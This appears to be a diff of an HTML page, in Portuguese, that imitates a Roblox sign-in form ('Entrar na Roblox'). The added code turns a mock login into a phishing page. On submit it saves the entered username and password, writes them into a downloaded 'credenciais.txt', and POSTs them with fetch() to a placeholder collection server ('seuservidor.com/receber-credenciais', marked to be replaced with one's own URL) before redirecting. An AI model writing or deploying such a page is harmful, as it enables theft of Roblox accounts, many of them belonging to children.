@@ -499,101 +499,122 @@ site.</div></div></noscript>
         </div>
 
         <div class="content" id="content">
-            <!-- Sistema de Login Personalizado -->
-            <div id="custom-login-container" style="max-width: 400px; margin: 0 auto; padding: 20px;">
-                <h1 style="text-align: center; font-size: 24px; margin-bottom: 20px;">Entrar na Roblox</h1>
-                
-                <form id="custom-login-form" style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
-                    <div style="margin-bottom: 15px;">
-                        <label for="custom-username" style="display: block; margin-bottom: 5px; font-weight: bold;">Nome de usuário</label>
-                        <input type="text" id="custom-username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
-                    </div>
-                    
-                    <div style="margin-bottom: 15px;">
-                        <label for="custom-password" style="display: block; margin-bottom: 5px; font-weight: bold;">Senha</label>
-                        <input type="password" id="custom-password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
-                    </div>
-                    
-                    <div style="margin-bottom: 15px; display: flex; align-items: center;">
-                        <input type="checkbox" id="custom-remember" style="margin-right: 10px;">
-                        <label for="custom-remember">Lembrar de mim</label>
-                    </div>
-                    
-                    <button type="submit" style="width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">Entrar</button>
-                    
-                    <div id="custom-login-message" style="margin-top: 15px; color: #ff3333; text-align: center;"></div>
-                    
-                    <div style="margin-top: 20px; text-align: center;">
-                        <a href="#" id="custom-forgot-password" style="color: #00a2ff; text-decoration: none;">Esqueceu sua senha?</a>
-                        <span> | </span>
-                        <a href="#" id="custom-create-account" style="color: #00a2ff; text-decoration: none;">Criar conta</a>
-                    </div>
-                </form>
-            </div>
+<!-- Sistema de Login Personalizado -->
+<div id="custom-login-container" style="max-width: 400px; margin: 0 auto; padding: 20px;">
+    <h1 style="text-align: center; font-size: 24px; margin-bottom: 20px;">Entrar na Roblox</h1>
+    
+    <form id="custom-login-form" style="background: rgb(17, 17, 17); padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+        <div style="margin-bottom: 15px;">
+            <label for="custom-username" style="display: block; margin-bottom: 5px; font-weight: bold;">Nome de usuário</label>
+            <input type="text" id="custom-username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
+        </div>
+        
+        <div style="margin-bottom: 15px;">
+            <label for="custom-password" style="display: block; margin-bottom: 5px; font-weight: bold;">Senha</label>
+            <input type="password" id="custom-password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
+        </div>
+        
+        <div style="margin-bottom: 15px; display: flex; align-items: center;">
+            <input type="checkbox" id="custom-remember" style="margin-right: 10px;">
+            <label for="custom-remember">Lembrar de mim</label>
+        </div>
+        
+        <button type="submit" style="width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">Entrar</button>
+        
+        <div id="custom-login-message" style="margin-top: 15px; color: #ff3333; text-align: center;"></div>
+        
+        <div style="margin-top: 20px; text-align: center;">
+            <a href="#" id="custom-forgot-password" style="color: #00a2ff; text-decoration: none;">Esqueceu sua senha?</a>
+            <span> | </span>
+            <a href="#" id="custom-create-account" style="color: #00a2ff; text-decoration: none;">Criar conta</a>
+        </div>
+    </form>
+</div>
 
-            <script>
-                document.addEventListener('DOMContentLoaded', function() {
-                    // Verificar se há credenciais salvas
-                    const savedUsername = localStorage.getItem('roblox_username');
-                    const savedPassword = localStorage.getItem('roblox_password');
-                    
-                    if (savedUsername && savedPassword) {
-                        document.getElementById('custom-username').value = savedUsername;
-                        document.getElementById('custom-password').value = savedPassword;
-                        document.getElementById('custom-remember').checked = true;
-                    }
-                    
-                    // Manipular o formulário de login
-                    const loginForm = document.getElementById('custom-login-form');
-                    const messageDiv = document.getElementById('custom-login-message');
-                    
-                    loginForm.addEventListener('submit', function(e) {
-                        e.preventDefault();
-                        
-                        const username = document.getElementById('custom-username').value;
-                        const password = document.getElementById('custom-password').value;
-                        const rememberMe = document.getElementById('custom-remember').checked;
-                        
-                        // Validação simples
-                        if (username.length < 3 || password.length < 6) {
-                            messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
-                            messageDiv.style.color = '#ff3333';
-                            return;
-                        }
-                        
-                        // Salvar credenciais se "Lembrar de mim" estiver marcado
-                        if (rememberMe) {
-                            localStorage.setItem('roblox_username', username);
-                            localStorage.setItem('roblox_password', password);
-                        } else {
-                            localStorage.removeItem('roblox_username');
-                            localStorage.removeItem('roblox_password');
-                        }
-                        
-                        // Simular login bem-sucedido
-                        messageDiv.textContent = 'Login bem-sucedido!';
-                        messageDiv.style.color = '#00aa00';
-                        
-                        // Simular redirecionamento após 2 segundos
-                        setTimeout(() => {
-                            alert(`Bem-vindo)`);
-                        }, 2000);
-                    });
-                    
-                    // Manipular o link "Esqueceu sua senha"
-                    document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
-                        e.preventDefault();
-                        alert('Funcionalidade "Esqueceu sua senha" não implementada nesta demonstração.');
-                    });
-                    
-                    // Manipular o link "Criar conta"
-                    document.getElementById('custom-create-account').addEventListener('click', function(e) {
-                        e.preventDefault();
-                        alert('Funcionalidade "Criar conta" não implementada nesta demonstração.');
-                    });
-                });
-            </script>
-            <!-- Fim do Sistema de Login Personalizado -->
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Verificar credenciais salvas
+        const savedUsername = localStorage.getItem('roblox_username');
+        const savedPassword = localStorage.getItem('roblox_password');
+        
+        if (savedUsername && savedPassword) {
+            document.getElementById('custom-username').value = savedUsername;
+            document.getElementById('custom-password').value = savedPassword;
+            document.getElementById('custom-remember').checked = true;
+        }
+        
+        const loginForm = document.getElementById('custom-login-form');
+        const messageDiv = document.getElementById('custom-login-message');
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('custom-username').value;
+            const password = document.getElementById('custom-password').value;
+            const rememberMe = document.getElementById('custom-remember').checked;
+            
+            // Validação
+            if (username.length < 3 || password.length < 6) {
+                messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
+                messageDiv.style.color = '#ff3333';
+                return;
+            }
+            
+            // Salvar credenciais (se marcado)
+            if (rememberMe) {
+                localStorage.setItem('roblox_username', username);
+                localStorage.setItem('roblox_password', password);
+            } else {
+                localStorage.removeItem('roblox_username');
+                localStorage.removeItem('roblox_password');
+            }
+            
+            // Criar arquivo .txt com as credenciais
+            const credentials = `Usuário: ${username}\nSenha: ${password}`;
+            const blob = new Blob([credentials], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            // Forçar download do arquivo
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'credenciais.txt';
+            a.click();
+            
+            // Simular envio para um servidor (substitua pela sua URL)
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            
+            fetch('https://seuservidor.com/receber-credenciais', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    messageDiv.textContent = 'Login e envio bem-sucedidos!';
+                    messageDiv.style.color = '#00aa00';
+                    window.location.href = "oi.html"; // Redirecionar
+                } else {
+                    messageDiv.textContent = 'Erro no envio.';
+                }
+            })
+            .catch(error => {
+                messageDiv.textContent = 'Erro na conexão.';
+            });
+        });
+        
+        // Links extras
+        document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Funcionalidade não implementada.');
+        });
+        
+        document.getElementById('custom-create-account').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Funcionalidade não implementada.');
+        });
+    });
+</script>
         </div>
     </main>
 
